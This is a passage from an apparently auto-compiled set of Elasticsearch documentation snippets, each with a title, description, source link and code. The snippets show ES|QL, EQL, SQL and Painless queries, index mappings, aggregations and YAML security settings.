1000\n\t}\n}\n```\n\n----------------------------------------\n\nTITLE: Calculating Connection Success Rate with CASE in ESQL\nDESCRIPTION: This query uses the CASE function to determine if a connection was successful based on log messages, then calculates the overall success rate. It shows how to use string matching in CASE conditions and aggregate results.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/functions/examples/case.md#2025-04-21_snippet_1\n\nLANGUAGE: esql\nCODE:\n```\nFROM sample_data\n| EVAL successful = CASE(\n    STARTS_WITH(message, \"Connected to\"), 1,\n    message == \"Connection error\", 0\n  )\n| STATS success_rate = AVG(successful)\n```\n\n----------------------------------------\n\nTITLE: Enriching Data with Languages Policy in ESQL\nDESCRIPTION: Demonstrates enriching a row containing a value '1' by joining it with a languages policy using the language_name field. The query maps the input value to retrieve the corresponding language name from the policy.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/commands/examples/enrich.csv-spec/enrich_rename.md#2025-04-21_snippet_0\n\nLANGUAGE: esql\nCODE:\n```\nROW a = \"1\"\n| ENRICH languages_policy ON a WITH name = language_name\n```\n\n----------------------------------------\n\nTITLE: Configuring Action-based Audit Event Ignore Policy in Elasticsearch YAML\nDESCRIPTION: This setting defines a list of action names or wildcards for which audit events will not be printed. The action name can be found in the 'action' field of the audit event. It is a dynamic cluster setting.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/configuration-reference/auding-settings.md#2025-04-21_snippet_2\n\nLANGUAGE: yaml\nCODE:\n```\nxpack.security.audit.logfile.events.ignore_filters.<policy_name>.actions\n```\n\n----------------------------------------\n\nTITLE: Example of PI Function Usage\nDESCRIPTION: Demonstrates how to retrieve the value of PI using the PI() function.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/sql/sql-functions-math.md#2025-04-21_snippet_19\n\nLANGUAGE: sql\nCODE:\n```\nSELECT PI();\n\n      PI()\n-----------------\n3.141592653589793\n```\n\n----------------------------------------\n\nTITLE: Custom Preference Search Query in Elasticsearch\nDESCRIPTION: Demonstrates setting a custom preference string for search routing to consistently target the same shards for caching purposes. Uses a match query on user.id field.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/rest-apis/search-shard-routing.md#2025-04-21_snippet_1\n\nLANGUAGE: console\nCODE:\n```\nGET /my-index-000001/_search?preference=my-custom-shard-string\n{\n  \"query\": {\n    \"match\": {\n      \"user.id\": \"kimchy\"\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Generating Version Field Automatic Conversion Query in Elasticsearch\nDESCRIPTION: This snippet demonstrates how to create a query for version comparison in Elasticsearch. It uses a range query on the version field with automatic type conversion.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/x-pack/plugin/eql/src/test/resources/querytranslator_tests.txt#2025-04-21_snippet_29\n\nLANGUAGE: eql\nCODE:\n```\nprocess where version > \"2\"\n```\n\nLANGUAGE: json\nCODE:\n```\n{\"range\":{\"version\":{\"gt\":\"2\"}}}\n```\n\n----------------------------------------\n\nTITLE: Querying with Head Pipe in EQL\nDESCRIPTION: Returns up to a specified number of events or sequences, starting with the earliest matches. This example returns up to three of the earliest powershell commands.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/eql/eql-pipe-ref.md#2025-04-21_snippet_0\n\nLANGUAGE: eql\nCODE:\n```\nprocess where process.name == \"powershell.exe\"\n| head 3\n```\n\n----------------------------------------\n\nTITLE: Basic Moving Function Syntax in Elasticsearch\nDESCRIPTION: Basic syntax example showing the structure of a moving_fn aggregation with required parameters buckets_path, window size, and script.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/aggregations/search-aggregations-pipeline-movfn-aggregation.md#2025-04-21_snippet_0\n\nLANGUAGE: js\nCODE:\n```\n{\n  \"moving_fn\": {\n    \"buckets_path\": \"the_sum\",\n    \"window\": 10,\n    \"script\": \"MovingFunctions.min(values)\"\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Configuring PEM Encoded Files for Remote Cluster Server SSL\nDESCRIPTION: These YAML configuration options specify the paths and passphrases for PEM encoded private keys, certificates, and trusted certificate authorities for the remote cluster server SSL/TLS.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/configuration-reference/security-settings.md#2025-04-21_snippet_31\n\nLANGUAGE: yaml\nCODE:\n```\nxpack.security.remote_cluster_server.ssl.key: \nxpack.security.remote_cluster_server.ssl.secure_key_passphrase: \nxpack.security.remote_cluster_server.ssl.certificate: \nxpack.security.remote_cluster_server.ssl.certificate_authorities: \n```\n\n----------------------------------------\n\nTITLE: Defining Exception Class in Java\nDESCRIPTION: This snippet defines the java.lang.Exception class, which is the base class for checked exceptions. It includes constructors, a method for retrieving the localized message (`getLocalizedMessage`), a method for retrieving the message (`getMessage`), and a method for getting the stack trace (`getStackTrace`).\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/modules/lang-painless/src/main/resources/org/elasticsearch/painless/java.lang.txt#2025-04-21_snippet_33\n\nLANGUAGE: java\nCODE:\n```\nclass java.lang.Exception {\n  ()\n  (String)\n  String getLocalizedMessage()\n  String getMessage()\n  StackTraceElement[] getStackTrace()\n}\n```\n\n----------------------------------------\n\nTITLE: ByteOrder Class Definition\nDESCRIPTION: Defines the ByteOrder class with constants for big-endian and little-endian byte ordering.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/modules/lang-painless/src/main/resources/org/elasticsearch/painless/java.nio.txt#2025-04-21_snippet_0\n\nLANGUAGE: java\nCODE:\n```\nclass java.nio.ByteOrder {\n  ByteOrder BIG_ENDIAN\n  ByteOrder LITTLE_ENDIAN\n}\n```\n\n----------------------------------------\n\nTITLE: DATEDIFF Example: Difference in Minutes\nDESCRIPTION: Illustrates calculating the difference in minutes between two datetimes using DATEDIFF. The example highlights the truncation behavior of DATEDIFF for time fields.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/sql/sql-functions-datetime.md#2025-04-21_snippet_33\n\nLANGUAGE: sql\nCODE:\n```\n\"SELECT DATEDIFF('minute', '2019-11-10T12:10:00.000Z'::datetime, '2019-11-10T12:15:59.999Z'::datetime) AS \\\"diffInMinutes\\\";\\n\\n      diffInMinutes\n------------------------\n5\"\n```\n\n----------------------------------------\n\nTITLE: Showing Invalid Numeric Type Casts in Painless\nDESCRIPTION: Examples of invalid numeric type casts in Painless that result in errors, illustrating cases where implicit casts are not allowed.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/scripting-languages/painless/painless-casting.md#2025-04-21_snippet_2\n\nLANGUAGE: painless\nCODE:\n```\nint a = 1.0; // error \nint b = 2;            \nbyte c = b;  // error \n```\n\n----------------------------------------\n\nTITLE: Assignment Operator Examples in Painless\nDESCRIPTION: Demonstrates field assignments with different types in a custom class Example. Shows direct value assignments and field access assignments.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/scripting-languages/painless/painless-operators-general.md#2025-04-21_snippet_3\n\nLANGUAGE: painless\nCODE:\n```\nExample example = new Example();\nexample.x = 1;\nexample.y = 2.0;\nexample.z = new ArrayList();\n```\n\nLANGUAGE: painless\nCODE:\n```\nExample example = new Example();\nexample.x = 1;\nexample.y = example.x;\n```\n\n----------------------------------------\n\nTITLE: Defining Geotile to Shape Ingest Pipeline in Elasticsearch\nDESCRIPTION: Creates an ingest pipeline named 'geotile2shape' that converts rectangular z/x/y geotiles to bounding boxes.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/enrich-processor/ingest-geo-grid-processor.md#2025-04-21_snippet_1\n\nLANGUAGE: console\nCODE:\n```\nPUT _ingest/pipeline/geotile2shape\n{\n  \"description\": \"translate rectangular z/x/y geotile to bounding box\",\n  \"processors\": [\n    {\n      \"geo_grid\": {\n        \"field\": \"geocell\",\n        \"tile_type\": \"geotile\"\n      }\n    }\n  ]\n}\n```\n\n----------------------------------------\n\nTITLE: LaTeX Comment for ESQL Generated Documentation\nDESCRIPTION: A LaTeX comment indicating this file is automatically generated by ESQL's AbstractFunctionTestCase and should not be manually edited.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/functions/description/to_aggregate_metric_double.md#2025-04-21_snippet_0\n\nLANGUAGE: latex\nCODE:\n```\n% This is generated by ESQL's AbstractFunctionTestCase. Do no edit it. See ../README.md for how to regenerate it.\n```\n\n----------------------------------------\n\nTITLE: Response from Hierarchical Nested Inner Hits Query in Elasticsearch\nDESCRIPTION: The response shows how Elasticsearch returns the matching document along with the inner hits for the nested path 'comments.votes'. The inner hits section contains the exact nested object that matched the query, preserving the hierarchical structure with nested field offsets.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/rest-apis/retrieve-inner-hits.md#2025-04-21_snippet_6\n\nLANGUAGE: console-result\nCODE:\n```\n{\n  ...,\n  \"hits\": {\n    \"total\" : {\n        \"value\": 1,\n        \"relation\": \"eq\"\n    },\n    \"max_score\": 0.6931471,\n    \"hits\": [\n      {\n        \"_index\": \"test\",\n        \"_id\": \"1\",\n        \"_score\": 0.6931471,\n        \"_source\": ...,\n        \"inner_hits\": {\n          \"comments.votes\": {\n            \"hits\": {\n              \"total\" : {\n                  \"value\": 1,\n                  \"relation\": \"eq\"\n              },\n              \"max_score\": 0.6931471,\n              \"hits\": [\n                {\n                  \"_index\": \"test\",\n                  \"_id\": \"1\",\n                  \"_nested\": {\n                    \"field\": \"comments\",\n                    \"offset\": 1,\n                    \"_nested\": {\n                      \"field\": \"votes\",\n                      \"offset\": 0\n                    }\n                  },\n                  \"_score\": 0.6931471,\n                  \"_source\": {\n                    \"value\": 1,\n                    \"voter\": \"kimchy\"\n                  }\n                }\n              ]\n            }\n          }\n        }\n      }\n    ]\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Parsing Log Data with GROK in ESQL\nDESCRIPTION: This ESQL code uses the GROK function to parse a log-like string, extracting date, IP address, email, and numeric values. It then keeps only the extracted fields in the result.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/commands/examples/docs.csv-spec/basicGrok.md#2025-04-21_snippet_0\n\nLANGUAGE: esql\nCODE:\n```\nROW a = \"2023-01-23T12:15:00.000Z 127.0.0.1 some.email@foo.com 42\"\n| GROK a \"\"\"%{TIMESTAMP_ISO8601:date} %{IP:ip} %{EMAILADDRESS:email} %{NUMBER:num}\"\"\"\n| KEEP date, ip, email, num\n```\n\n----------------------------------------\n\nTITLE: Configuring GCE Discovery in Elasticsearch\nDESCRIPTION: YAML configuration to enable GCE discovery in Elasticsearch. It specifies the GCE project ID, zone, and sets GCE as the seed provider for Elasticsearch node discovery.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch-plugins/discovery-gce-usage-long.md#2025-04-21_snippet_8\n\nLANGUAGE: yaml\nCODE:\n```\ncloud:\n  gce:\n      project_id: es-cloud\n      zone: europe-west1-a\ndiscovery:\n      seed_providers: gce\n```\n\n----------------------------------------\n\nTITLE: Converting Multiple Values to Aggregate Metric Double in ESQL\nDESCRIPTION: This example demonstrates converting an array of integer values to an aggregate_metric_double. The function calculates min, max, sum, and count from all values in the array.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/functions/examples/to_aggregate_metric_double.md#2025-04-21_snippet_1\n\nLANGUAGE: esql\nCODE:\n```\nROW x = [5032, 11111, 40814]\n| EVAL agg_metric = TO_AGGREGATE_METRIC_DOUBLE(x)\n```\n\n----------------------------------------\n\nTITLE: Using minimum_should_match with Multiple Fields\nDESCRIPTION: Example showing minimum_should_match with multiple search fields. Without explicit operators, this creates a disjunction max query across the fields where minimum_should_match cannot be applied.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/query-dsl/query-dsl-query-string-query.md#2025-04-21_snippet_20\n\nLANGUAGE: console\nCODE:\n```\nGET /_search\n{\n  \"query\": {\n    \"query_string\": {\n      \"fields\": [\n        \"title\",\n        \"content\"\n      ],\n      \"query\": \"this that thus\",\n      \"minimum_should_match\": 2\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: YAML Configuration Block\nDESCRIPTION: YAML front matter block defining mapped documentation pages.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch-plugins/snapshotrestore-repository-plugins.md#2025-04-21_snippet_0\n\nLANGUAGE: yaml\nCODE:\n```\nmapped_pages:\\n  - https://www.elastic.co/guide/en/elasticsearch/plugins/current/repository.html\n```\n\n----------------------------------------\n\nTITLE: Setting up an index with synthetic source for long field type\nDESCRIPTION: Creates an index with synthetic source enabled and a long field, then demonstrates how synthetic source will sort numeric values in the array.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/mapping-reference/number.md#2025-04-22_snippet_1\n\nLANGUAGE: console\nCODE:\n```\nPUT idx\n{\n  \"settings\": {\n    \"index\": {\n      \"mapping\": {\n        \"source\": {\n          \"mode\": \"synthetic\"\n        }\n      }\n    }\n  },\n  \"mappings\": {\n    \"properties\": {\n      \"long\": { \"type\": \"long\" }\n    }\n  }\n}\nPUT idx/_doc/1\n{\n  \"long\": [0, 0, -123466, 87612]\n}\n```\n\n----------------------------------------\n\nTITLE: Complete Moving Function Query Example\nDESCRIPTION: Full example showing a moving function aggregation embedded within a date histogram, including a sum metric calculation.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/aggregations/search-aggregations-pipeline-movfn-aggregation.md#2025-04-21_snippet_1\n\nLANGUAGE: console\nCODE:\n```\nPOST /_search\n{\n  \"size\": 0,\n  \"aggs\": {\n    \"my_date_histo\": {                  \n      \"date_histogram\": {\n        \"field\": \"date\",\n        \"calendar_interval\": \"1M\"\n      },\n      \"aggs\": {\n        \"the_sum\": {\n          \"sum\": { \"field\": \"price\" }   \n        },\n        \"the_movfn\": {\n          \"moving_fn\": {\n            \"buckets_path\": \"the_sum\",  \n            \"window\": 10,\n            \"script\": \"MovingFunctions.unweightedAvg(values)\"\n          }\n        }\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Next Page Search with search_after and PIT in Elasticsearch\nDESCRIPTION: This example demonstrates how to get subsequent pages of results by using the search_after parameter with sort values from the previous page's last hit. It also shows how to optimize performance by disabling total hit tracking.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/rest-apis/paginate-search-results.md#2025-04-21_snippet_6\n\nLANGUAGE: console\nCODE:\n```\nGET /_search\n{\n  \"size\": 10000,\n  \"query\": {\n    \"match\" : {\n      \"user.id\" : \"elkbee\"\n    }\n  },\n  \"pit\": {\n    \"id\":  \"46ToAwMDaWR5BXV1aWQyKwZub2RlXzMAAAAAAAAAACoBYwADaWR4BXV1aWQxAgZub2RlXzEAAAAAAAAAAAEBYQADaWR5BXV1aWQyKgZub2RlXzIAAAAAAAAAAAwBYgACBXV1aWQyAAAFdXVpZDEAAQltYXRjaF9hbGw_gAAAAA==\", <1>\n    \"keep_alive\": \"1m\"\n  },\n  \"sort\": [\n    {\"@timestamp\": {\"order\": \"asc\", \"format\": \"strict_date_optional_time_nanos\"}}\n  ],\n  \"search_after\": [                                <2>\n    \"2021-05-20T05:30:04.832Z\",\n    4294967298\n  ],\n  \"track_total_hits\": false                        <3>\n}\n```\n\n----------------------------------------\n\nTITLE: Creating Custom Analyzer with Keep Types Filter\nDESCRIPTION: Example of creating a custom analyzer that uses a keep_types filter to retain only alphanumeric tokens.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/text-analysis/analysis-keep-types-tokenfilter.md#2025-04-21_snippet_2\n\nLANGUAGE: console\nCODE:\n```\nPUT keep_types_example\n{\n  \"settings\": {\n    \"analysis\": {\n      \"analyzer\": {\n        \"my_analyzer\": {\n          \"tokenizer\": \"standard\",\n          \"filter\": [ \"extract_alpha\" ]\n        }\n      },\n      \"filter\": {\n        \"extract_alpha\": {\n          \"type\": \"keep_types\",\n          \"types\": [ \"<ALPHANUM>\" ]\n        }\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Extracting Year from Date using DATE_EXTRACT in ESQL\nDESCRIPTION: This snippet demonstrates how to parse a date string into a date object and then extract the year component from it. It uses the DATE_PARSE function to convert a string to a date, and DATE_EXTRACT to get the year.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/kibana/docs/functions/date_extract.md#2025-04-21_snippet_0\n\nLANGUAGE: esql\nCODE:\n```\nROW date = DATE_PARSE(\"yyyy-MM-dd\", \"2022-05-06\")\n| EVAL year = DATE_EXTRACT(\"year\", date)\n```\n\n----------------------------------------\n\nTITLE: Indexing WKT MultiPolygon in Elasticsearch\nDESCRIPTION: Example of indexing a Well-Known Text (WKT) MultiPolygon geometry in Elasticsearch. This represents the same geometry as the GeoJSON example but using WKT syntax, with the second polygon containing a hole.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/mapping-reference/geo-shape.md#2025-04-21_snippet_15\n\nLANGUAGE: json\nCODE:\n```\nPOST /example/_doc\n{\n  \"location\" : \"MULTIPOLYGON (((102.0 2.0, 103.0 2.0, 103.0 3.0, 102.0 3.0, 102.0 2.0)), ((100.0 0.0, 101.0 0.0, 101.0 1.0, 100.0 1.0, 100.0 0.0), (100.2 0.2, 100.8 0.2, 100.8 0.8, 100.2 0.8, 100.2 0.2)))\"\n}\n```\n\n----------------------------------------\n\nTITLE: Configuring Elasticsearch Indices for LOOKUP JOIN with Console Commands\nDESCRIPTION: This snippet shows how to create Elasticsearch indices using console PUT commands with appropriate mappings for use with the LOOKUP JOIN command. The 'threat_list' index is created with the 'lookup' index.mode setting, enabling it to serve as a lookup index, and includes fields representing IP addresses and threat metadata. The 'firewall_logs' index is set up with mappings for network logs including timestamps, source and destination IPs, actions, and byte counts. These indices must be properly configured before running LOOKUP JOIN queries.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/esql-lookup-join.md#_snippet_0\n\nLANGUAGE: console\nCODE:\n```\nPUT threat_list\n{\n  \"settings\": {\n    \"index.mode\": \"lookup\" # The lookup index must use this mode\n  },\n  \"mappings\": {\n    \"properties\": {\n      \"source.ip\": { \"type\": \"ip\" },\n      \"threat_level\": { \"type\": \"keyword\" },\n      \"threat_type\": { \"type\": \"keyword\" },\n      \"last_updated\": { \"type\": \"date\" }\n    }\n  }\n}\n```\n\nLANGUAGE: console\nCODE:\n```\nPUT firewall_logs\n{\n  \"mappings\": {\n    \"properties\": {\n      \"timestamp\": { \"type\": \"date\" },\n      \"source.ip\": { \"type\": \"ip\" },\n      \"destination.ip\": { \"type\": \"ip\" },\n      \"action\": { \"type\": \"keyword\" },\n      \"bytes_transferred\": { \"type\": \"long\" }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Scripted Percentile Ranks with Runtime Fields in Elasticsearch\nDESCRIPTION: Illustrates using runtime fields with percentile ranks aggregation to perform calculations on transformed values, converting milliseconds to seconds.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/aggregations/search-aggregations-metrics-percentile-rank-aggregation.md#2025-04-21_snippet_2\n\nLANGUAGE: console\nCODE:\n```\nGET latency/_search\n{\n  \"size\": 0,\n  \"runtime_mappings\": {\n    \"load_time.seconds\": {\n      \"type\": \"long\",\n      \"script\": {\n        \"source\": \"emit(doc['load_time'].value / params.timeUnit)\",\n        \"params\": {\n          \"timeUnit\": 1000\n        }\n      }\n    }\n  },\n  \"aggs\": {\n    \"load_time_ranks\": {\n      \"percentile_ranks\": {\n        \"values\": [ 500, 600 ],\n        \"field\": \"load_time.seconds\"\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Implementing Hindi Analyzer in Elasticsearch\nDESCRIPTION: Custom implementation of the built-in Hindi analyzer with Hindi stopwords, keyword marker for exclusions from stemming, decimal digit normalization, Indic normalization, Hindi normalization, and Hindi stemming.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/text-analysis/analysis-lang-analyzer.md#2025-04-21_snippet_18\n\nLANGUAGE: console\nCODE:\n```\nPUT /hindi_example\n{\n  \"settings\": {\n    \"analysis\": {\n      \"filter\": {\n        \"hindi_stop\": {\n          \"type\":       \"stop\",\n          \"stopwords\":  \"_hindi_\" <1>\n        },\n        \"hindi_keywords\": {\n          \"type\":       \"keyword_marker\",\n          \"keywords\":   [\"उदाहरण\"] <2>\n        },\n        \"hindi_stemmer\": {\n          \"type\":       \"stemmer\",\n          \"language\":   \"hindi\"\n        }\n      },\n      \"analyzer\": {\n        \"rebuilt_hindi\": {\n          \"tokenizer\":  \"standard\",\n          \"filter\": [\n            \"lowercase\",\n            \"decimal_digit\",\n            \"hindi_keywords\",\n            \"indic_normalization\",\n            \"hindi_normalization\",\n            \"hindi_stop\",\n            \"hindi_stemmer\"\n          ]\n        }\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Searching with Custom Routing Values in Elasticsearch\nDESCRIPTION: Example of restricting a search to specific shards by providing routing values in the search request, which improves search performance.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/mapping-reference/mapping-routing-field.md#2025-04-21_snippet_3\n\nLANGUAGE: console\nCODE:\n```\nGET my-index-000001/_search?routing=user1,user2 <1>\n{\n  \"query\": {\n    \"match\": {\n      \"title\": \"document\"\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Executing a Simple Query String in Elasticsearch\nDESCRIPTION: This snippet demonstrates how to use the simple query string to search documents in Elasticsearch. It utilizes fields and operators to define the query logic. No special dependencies other than Elasticsearch are required. The query emphasizes searching with a default boolean logic and given fields.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/query-dsl/query-dsl-simple-query-string-query.md#2025-04-21_snippet_0\n\nLANGUAGE: console\nCODE:\n```\nGET /_search\n{\n  \"query\": {\n    \"simple_query_string\" : {\n        \"query\": \"\\\"fried eggs\\\" +(eggplant | potato) -frittata\",\n        \"fields\": [\"title^5\", \"body\"],\n        \"default_operator\": \"and\"\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Elasticsearch query boosting documents based on date\nDESCRIPTION: This snippet shows a `bool` search that returns documents with the name `chocolate` and boosts documents with a `production_date` closer to `now` using the `distance_feature` query. The `pivot` parameter defines the distance from the origin at which the relevance score is halved.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/query-dsl/query-dsl-distance-feature-query.md#2025-04-21_snippet_2\n\nLANGUAGE: console\nCODE:\n```\nGET /items/_search\n{\n  \"query\": {\n    \"bool\": {\n      \"must\": {\n        \"match\": {\n          \"name\": \"chocolate\"\n        }\n      },\n      \"should\": {\n        \"distance_feature\": {\n          \"field\": \"production_date\",\n          \"pivot\": \"7d\",\n          \"origin\": \"now\"\n        }\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Configuring PEM Encoded Files for HTTP TLS/SSL in Elasticsearch YAML\nDESCRIPTION: Specifies paths and passphrases for PEM encoded files used in HTTP TLS/SSL configuration. Includes settings for private key, certificate, and trusted certificate authorities.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/configuration-reference/security-settings.md#2025-04-21_snippet_23\n\nLANGUAGE: yaml\nCODE:\n```\nxpack.security.http.ssl.key: /path/to/private_key.pem\nxpack.security.http.ssl.key_passphrase: passphrase\nxpack.security.http.ssl.secure_key_passphrase: secure_passphrase\nxpack.security.http.ssl.certificate: /path/to/certificate.pem\nxpack.security.http.ssl.certificate_authorities: [\"/path/to/ca1.pem\", \"/path/to/ca2.pem\"]\n```\n\n----------------------------------------\n\nTITLE: Day of Week Aggregation Using Runtime Field\nDESCRIPTION: Example showing how to aggregate data by day of week using a runtime field and terms aggregation.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/aggregations/search-aggregations-bucket-datehistogram-aggregation.md#2025-04-21_snippet_16\n\nLANGUAGE: console\nCODE:\n```\nPOST /sales/_search?size=0\n{\n  \"runtime_mappings\": {\n    \"date.day_of_week\": {\n      \"type\": \"keyword\",\n      \"script\": \"emit(doc['date'].value.dayOfWeekEnum.getDisplayName(TextStyle.FULL, Locale.ENGLISH))\"\n    }\n  },\n  \"aggs\": {\n    \"day_of_week\": {\n      \"terms\": { \"field\": \"date.day_of_week\" }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Using cross_fields Query Type in Elasticsearch\nDESCRIPTION: Example of a cross_fields query that searches for \"Will Smith\" across first_name and last_name fields, requiring all terms to be present in at least one field. This approach solves problems with term frequency differences across fields.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/query-dsl/query-dsl-multi-match-query.md#2025-04-21_snippet_10\n\nLANGUAGE: json\nCODE:\n```\nGET /_search\n{\n  \"query\": {\n    \"multi_match\" : {\n      \"query\":      \"Will Smith\",\n      \"type\":       \"cross_fields\",\n      \"fields\":     [ \"first_name\", \"last_name\" ],\n      \"operator\":   \"and\"\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Case-Insensitive Keywords in Elasticsearch SQL\nDESCRIPTION: Shows that SQL keywords are case-insensitive in Elasticsearch SQL, allowing flexibility in query writing while maintaining the same functionality.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/sql/sql-lexical-structure.md#2025-04-21_snippet_1\n\nLANGUAGE: sql\nCODE:\n```\nselect * fRoM table;\n```\n\n----------------------------------------\n\nTITLE: Script-based Sorting in Elasticsearch\nDESCRIPTION: Example of custom script-based sorting using Painless scripting language with parameters.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/rest-apis/sort-search-results.md#2025-04-21_snippet_18\n\nLANGUAGE: console\nCODE:\n```\nGET /_search\n{\n  \"query\": {\n    \"term\": { \"user\": \"kimchy\" }\n  },\n  \"sort\": {\n    \"_script\": {\n      \"type\": \"number\",\n      \"script\": {\n        \"lang\": \"painless\",\n        \"source\": \"doc['field_name'].value * params.factor\",\n        \"params\": {\n          \"factor\": 1.1\n        }\n      },\n      \"order\": \"asc\"\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Configuring Append Processor in Elasticsearch Ingest Pipeline\nDESCRIPTION: This snippet demonstrates how to configure the Append processor in an Elasticsearch ingest pipeline. It appends multiple values, including static strings and dynamic template snippets, to the 'tags' field of a document.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/enrich-processor/append-processor.md#2025-04-21_snippet_0\n\nLANGUAGE: json\nCODE:\n```\n{\n  \"append\": {\n    \"field\": \"tags\",\n    \"value\": [\"production\", \"{{{app}}}\", \"{{{owner}}}\"]\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Mapping Configuration for Date Fields in Elasticsearch\nDESCRIPTION: JSON configuration for defining date field mappings in Elasticsearch. This example shows how to set up the 'input_datetime' field as a date type in the index mapping.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/scripting-languages/painless/using-datetime-in-painless.md#2025-04-21_snippet_19\n\nLANGUAGE: JSON\nCODE:\n```\n{\n  \"mappings\": {\n    ...\n    \"properties\": {\n      ...\n      \"input_datetime\": {\n        \"type\": \"date\"\n      }\n      ...\n    }\n    ...\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Adding a New Field with Painless\nDESCRIPTION: Updates multiple fields by adding a nickname field and changing the last name using Painless.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/scripting-languages/painless/brief-painless-walkthrough.md#2025-04-21_snippet_7\n\nLANGUAGE: console\nCODE:\n```\nPOST hockey/_update/1\n{\n  \"script\": {\n    \"lang\": \"painless\",\n    \"source\": \"\"\"\n      ctx._source.last = params.last;\n      ctx._source.nick = params.nick\n    \"\"\",\n    \"params\": {\n      \"last\": \"gaudreau\",\n      \"nick\": \"hockey\"\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Creating an Index with Synthetic Source and Keyword Field\nDESCRIPTION: This example shows how to create an index with synthetic _source enabled and a keyword field. It demonstrates how synthetic source affects the storage and retrieval of keyword field values.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/mapping-reference/keyword.md#2025-04-21_snippet_1\n\nLANGUAGE: console\nCODE:\n```\nPUT idx\n{\n  \"settings\": {\n    \"index\": {\n      \"mapping\": {\n        \"source\": {\n          \"mode\": \"synthetic\"\n        }\n      }\n    }\n  },\n  \"mappings\": {\n    \"properties\": {\n      \"kwd\": { \"type\": \"keyword\" }\n    }\n  }\n}\nPUT idx/_doc/1\n{\n  \"kwd\": [\"foo\", \"foo\", \"bar\", \"baz\"]\n}\n```\n\n----------------------------------------\n\nTITLE: Initializing ElasticSearch Client in JavaScript\nDESCRIPTION: This snippet sets up an ElasticSearch client using the official JavaScript library, configuring connection parameters like node URL and authentication details. It enables subsequent operations such as indexing and searching documents.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/plugins/analysis-kuromoji/src/test/resources/org/elasticsearch/plugin/analysis/kuromoji/user_dict.txt#_snippet_0\n\nLANGUAGE: JavaScript\nCODE:\n```\nconst { Client } = require('@elastic/elasticsearch');\n\nconst client = new Client({\n  node: 'http://localhost:9200',\n  auth: {\n    username: 'user',\n    password: 'pass'\n  }\n});\n```\n\n----------------------------------------\n\nTITLE: Creating a ROW with Mixed Data Types in ESQL\nDESCRIPTION: This snippet demonstrates how to create a ROW in ESQL with integer, string, and null values. It initializes a row named 'a' with three columns of different data types.\nSOURCE: 